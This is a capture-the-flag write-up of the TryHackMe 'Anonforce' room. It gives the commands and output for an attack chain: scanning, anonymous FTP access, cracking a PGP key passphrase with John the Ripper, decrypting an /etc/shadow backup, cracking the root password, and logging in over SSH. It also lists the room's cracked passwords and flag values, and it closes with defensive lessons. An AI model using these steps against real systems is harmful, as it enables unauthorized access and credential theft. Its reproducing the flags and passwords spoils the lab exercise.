# TryHackMe — Anonforce

## Overview

| Property       | Value                          |
|----------------|--------------------------------|
| Platform       | TryHackMe                      |
| Room           | Anonforce                      |
| Difficulty     | Easy                           |
| Target IP      | 10.145.157.162                 |
| Attack Vector  | Anonymous FTP → PGP Key Crack → Shadow File Decrypt → Root |

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 10.145.157.162
```

Two open ports discovered:

| Port | Service | Version                  |
|------|---------|--------------------------|
| 21   | FTP     | vsftpd 3.0.3             |
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu     |

Key finding: **Anonymous FTP login is allowed**, and the FTP root maps directly to the server's filesystem root (`/`). The entire directory structure — `/bin`, `/boot`, `/etc`, `/home`, `/root` — is exposed to anonymous users.

Nmap also flagged a suspicious directory:

```
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
```

Permissions `777` and a name that screams "look here."

## Enumeration

### FTP — Anonymous Access

```bash
ftp 10.145.157.162
# Login: anonymous / (no password)
```

Navigating to `/notread`:

```
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
```

Two PGP-related files:
- **`private.asc`** — ASCII-armored PGP private key (should never be publicly accessible)
- **`backup.pgp`** — PGP-encrypted file (likely contains sensitive data)

Downloaded both:

```bash
ftp> binary
ftp> get backup.pgp
ftp> get private.asc
```

## Exploitation

### Step 1 — Cracking the PGP Private Key Passphrase

The private key is protected by a passphrase. Used `gpg2john` to extract a hash suitable for John the Ripper:

```bash
gpg2john private.asc > key_hash.txt
john key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```
xbox360          (anonforce)
```

Passphrase cracked instantly — **`xbox360`**. The key used SHA-1 for s2k hashing with only 65,536 iterations and AES-192 cipher — weak by modern standards.

### Step 2 — Importing the Key and Decrypting the Backup

```bash
gpg --import private.asc
# Enter passphrase: xbox360

gpg --decrypt backup.pgp
```

The decrypted output revealed a complete `/etc/shadow` file — the crown jewels of a Linux system. Two accounts had real password hashes:

| User     | Hash Type       | Hash Prefix |
|----------|-----------------|-------------|
| root     | SHA-512         | `$6$`       |
| melodias | MD5             | `$1$`       |

### Step 3 — Cracking the Root Password

```bash
echo 'root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::' > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```
hikari           (root)
```

Root password — **`hikari`**. Cracked in 12 seconds despite SHA-512, because the password was in rockyou.txt.

### Step 4 — SSH as Root

```bash
ssh root@10.145.157.162
# Password: hikari
```

## Flags

```bash
cat /root/root.txt
# f706456440c7af4187810c31c6cebdce

cat /home/melodias/user.txt
# 606083fd33beb1284fc51f411a706af8
```

## Attack Path

```
                    ┌─────────────────┐
                    │   Nmap Scan      │
                    │ Port 21, 22 open │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ Anonymous FTP    │
                    │ Full filesystem  │
                    │ exposed          │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ /notread dir     │
                    │ backup.pgp       │
                    │ private.asc      │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ gpg2john + John  │
                    │ Passphrase:      │
                    │ xbox360          │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ GPG Decrypt      │
                    │ /etc/shadow      │
                    │ extracted        │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ John the Ripper  │
                    │ root:hikari      │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │ SSH as root      │
                    │ Both flags       │
                    │ captured         │
                    └─────────────────┘
```

## Key Takeaways

1. **Anonymous FTP exposing the root filesystem** is a catastrophic misconfiguration. FTP should never serve `/` — it should be chrooted to a dedicated directory with minimal content.

2. **PGP private keys in publicly accessible locations** defeat the entire purpose of asymmetric cryptography. The private key must remain private.

3. **Weak passphrase on the PGP key** (`xbox360`) made the key extraction trivial. A strong, unique passphrase would have made bruteforce infeasible even with the key exposed.

4. **Password hashing with MD5 (`$1$`)** is obsolete. Modern systems should use Argon2id or at minimum bcrypt/scrypt. Even SHA-512 (`$6$`) with a dictionary password fell in seconds.

5. **The attack chain** required no exploitation of software vulnerabilities — every step leveraged misconfigurations and weak credentials. This is representative of many real-world compromises.
